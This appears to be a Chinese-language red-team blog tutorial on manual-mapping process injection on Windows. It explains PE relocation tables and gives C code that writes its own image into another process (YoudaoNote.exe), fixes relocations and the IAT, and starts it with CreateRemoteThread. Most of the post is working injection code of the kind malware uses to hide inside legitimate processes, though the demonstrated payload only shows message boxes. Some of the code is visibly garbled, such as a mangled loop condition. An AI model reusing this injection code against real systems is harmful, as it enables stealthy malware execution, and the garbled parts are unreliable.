VirtualAddress为重定位表的RVA，Size为重定位表的大小
上面的结构只是说明重定位表在哪里、有多大，并不是真正的重定位表
VirtualAddress中存储的是RVA，如果要在FileBuffer中定位，需要将RVA转换成FOA，即内存偏移->文件偏移
真正的重定位表的结构如下：
    typedef struct _IMAGE_BASE_RELOCATION {
        DWORD   VirtualAddress;
        DWORD   SizeOfBlock;
    } IMAGE_BASE_RELOCATION;
    typedef IMAGE_BASE_RELOCATION ，* PIMAGE_BASE_RELOCATION;
一般情况下，EXE都是可以按照ImageBase的地址进行加载的。因为Exe拥有自己独立的4GB 的虚拟内存空间。但DLL
不是，DLL是有EXE使用它，才加载到相关EXE的进程空间的。为了提高搜索的速度，模块间地址也是要对齐的 模块地址对齐为10000H 也就是64K。
重定位表的具体解析如图所示
根据解析编写重定位表的代码如下
    PIMAGE_BASE_RELOCATION pRelocationDirectory = (PIMAGE_BASE_RELOCATION)((DWORD)pAddr + GetRelocAddr(pAddr));
        while (pRelocationDirectory->SizeOfBlock != 0 && pRelocationDirectory->VirtualAddress != 0) 
        {
            DWORD sizeOfWord = (pRelocationDirectory->SizeOfBlock - 8) / 2;
            PWORD pWord = (PWORD)((DWORD)pRelocationDirectory + 8);
            for (int i = 0; i > 12 != 0)
                {
                    PDWORD offsetAddr = (PDWORD)(pRelocationDirectory->VirtualAddress + (*pWord & 0xFFF) + (DWORD)pAddr);
                    *offsetAddr = *offsetAddr + (DWORD)pExAddr - GetImageBase(win32/imagebase);
                    pWord++;
                    continue;
                }
                pWord++;
            }
            pRelocationDirectory = (PIMAGE_BASE_RELOCATION)((DWORD)pRelocationDirectory + pRelocationDirectory->SizeOfBlock);
        }
然后就是主函数的编写，首先获取当前进程的路径
    ::GetModuleFileName(NULL, path, MAX_PATH);
再获取模块基址
    HMODULE imagebase = ::GetModuleHandle(NULL);
通过PE头获取`SizeOfImage`参数
    _size = pOptionHeader->SizeOfImage;
使用`VirtualAlloc`申请空间
    pAddr = VirtualAlloc(NULL, _size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
打开要注入的进程
    hprocess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, _getProcessPid(ProcessName));
使用`VirtualAllocEx`申请内存
    pExAddr = ::VirtualAllocEx(hprocess, NULL, _size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
然后再修复重定位表和IAT表
    DWORD FixNewIATTable = (DWORD)FixIATTable  + (DWORD)pAddr - (DWORD)imagebase;
创建远程线程并等待消息返回，关闭句柄
    hThread = ::CreateRemoteThread(hprocess, NULL, 0, (LPTHREAD_START_ROUTINE)FixNewIATTable, pAddr, 0, NULL);
    WaitForSingleObject(hThread, -1);
    CloseHandle(hThread);
注入函数的完整代码如下
    VOID inject(LPCWSTR InjetName)
    {
        //获取要注入的进程
        WCHAR ProcessName[] = TEXT("YoudaoNote.exe");
        DWORD dwPid = GetPid(ProcessName);
        if (dwPid == 0) 
        {
            printf("[!] GetPID failed,error is : %d\n\n", GetLastError());
            return 0;
        }
        else
        {
            printf("[*] GetPID successfully!\n\n");
        }
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, dwPid);
        if (hProcess == NULL) 
        {
            printf("[!] OpenProcess failed,error is : %d\n\n", GetLastError());
            return 0;
        }
        else
        {
            printf("[*] OpenProcess successfully!\n\n");
        }
        //获取loadlibrary和GetProcAddress的函数地址
        HMODULE hKernel32 = LoadLibrary(TEXT("Kernel32.dll"));
        MyLoadlibrary = (pLoadLibrary)GetProcAddress(hKernel32, "LoadLibraryA");
        pMyGetAddress = (pGetProcAddress)GetProcAddress(hKernel32, "GetProcAddress");
        //获取函数偏移
        DWORD CurrentImageBase = (DWORD)GetModuleHandle(NULL);
        DWORD dwTemp = (DWORD)ThreadProc;
        //修正地址
        if (*((char*)dwTemp) == (char)0xE9) 
        {
            dwTemp = dwTemp + *((PDWORD)(dwTemp + 1)) + 5;
        }
        DWORD pFun = dwTemp - CurrentImageBase;
        LPVOID pImageBuff = LoadImageBuffSelf();
        //在要注入的程序申请空间
        DWORD SizeofImage = GetSizeOfImage(pImageBuff);
        DWORD ImageBase = GetImageBase(pImageBuff);
        LPVOID pAlloc = NULL;
        for (DWORD i = 0; pAlloc == NULL; i += 0x10000)
        {
            pAlloc = VirtualAllocEx(hProcess, (LPVOID)(ImageBase + i), SizeofImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        }
        if ((DWORD)pAlloc != ImageBase) 
        {
            //修复重定向表
            ChangeImageBase(pImageBuff, (DWORD)pAlloc);
            printf("[*] ChangeImageBase successfully!\n\n");
        }
        //写入进程
        if (WriteProcessMemory(hProcess, pAlloc, pImageBuff, SizeofImage, NULL) == false) 
        {
            printf("[!] WriteProcessMemory failed,error is : %d\n\n", GetLastError());
            return 0;
        }
        else
        {
            printf("[*] WriteProcessMemory successfully!\n\n");
        }
        //创建远程线程
        if (NULL == CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD)pAlloc + pFun), (LPVOID)(pAlloc), 0, NULL))
        {
            printf("[!] CreateRemoteThread failed,error is : %d\n\n", GetLastError());
            return 0;
        }
        else
        {
            printf("[*] CreateRemoteThread successfully!\n\n");
        } 
        printf("[*] WriteProcessMemory successfully!\n\n");
    }
# 实现效果
这里选择注入的程序是有道云
效果的话就是每隔一秒中弹窗内存写入的MessageBox
运行程序注入成功，首先弹一个MessageBox的框
再每隔一秒钟弹一个内存写入的框，证明内存写入成功
欢迎关注公众号 **红队蓝军**